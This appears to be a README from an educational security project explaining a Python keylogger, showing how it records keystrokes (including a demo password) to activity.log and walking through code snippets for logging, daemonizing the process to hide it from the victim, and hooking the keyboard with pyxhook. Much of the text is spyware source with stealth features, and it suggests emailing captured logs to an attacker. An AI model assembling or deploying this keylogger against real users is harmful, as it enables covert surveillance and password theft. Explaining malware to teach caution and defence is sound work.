# Spyware

There exist many ways of spying on the victim. Our **spyware** is represented by **keylogger**, a simple program that monitors pressed keys on the keyboard and can see everything you type. This **keylogger** is implemented in the file `keylogger.py`.

#### Demonstration of behavior

We don't need any specific preparation before an execution of the keylogger (`./keylogger.py`). We can observe that after the execution nothing happened and we can type new commands, just like in the case of us pressing only the key `Enter`. Now you can do on your system anything you want. For the demonstration you can open a browser and type something like `Passwd` representing your potential password, just like you would do on any login page of your social media.

You can now spot that in the same folder as our **keylogger** is located a new file `activity.log`. By observing the file your can see that it contains all keys you have pressed on your keyboard after the execution, including your password `Passwd`. Attacker can easily access those file and modify the keylogger to send them on specific e-mail address or with a combination with different kind of malware he might gain direct access to them via network.

```
Key: P
Key: a
Key: s
Key: s
Key: w
Key: d
```

Creation of **keylogger** is very simple process as it is described below and anyone can do it just with a basic knowledge of programming and understandment of operating systems. That's why we should be always cautions when we execute any uncommon or not trusted file.

#### How does it work?

 - Firstly, we configure our logger. We can specify the file in which should be the data stored as well as a format of the message.
   ```python
   logging.basicConfig(
       level=logging.DEBUG,
       filename='activity.log',
       format='Key: %(message)s',
   )
   ```
 - Then we have to obtain the logging file handler. We will explain why in the next step.
   ```python
   handler = logging.getLogger().handlers[0].stream
   ```
 - To make our spyware harder to spot by the victim, we want it to run in the background as a **daemon**.
   To learn more about daemons, see [the guide to daemons](https://kb.iu.edu/d/aiau). For this purpose we
   will use a standart Python module `daemon` that will allow us to daemonize our **keylogger**.
   When the the daemon is created, we will loose connections to all file handler like `stdout` or even 
   our logging file unless we specify that the files should be preserved. That's why we have obtained
   logging file handler in the previous step. In the context of our hidden daemon we can now create the
   keylogger and start its activity.
   ```python
   # Daemonize the process to hide it from the victim.
   with daemon.DaemonContext(files_preserve=[handler]):
       # Create keylogger.
       keylogger = Keylogger('SimpleSpyware')
       # Start logging activity of the user.
       keylogger.start_logging()
   ```
  - For obtaining the _key press events_ we can use a python module for Linux called `pyxhook`. If we
    would create a keylogger for Windows, we should use module `pyHook` instead, but their interface is
    very similar. We create a **hooking manager**, that will manage event handling and allows us to 
    set a callback for those events. Callback is in our case a function that will be called each time a new
    event is obtained (__keydown_callback_). The only thing this method does is logging the key into our
    specified file `activity.log`.
    ```python
    hook_manager = pyxhook.HookManager()
    # Assign callback for handling key strokes.
    hook_manager.KeyDown = self._keydown_callback
    # Hook the keyboard and start logging.
    hook_manager.HookKeyboard()
    hook_manager.start()
    ```
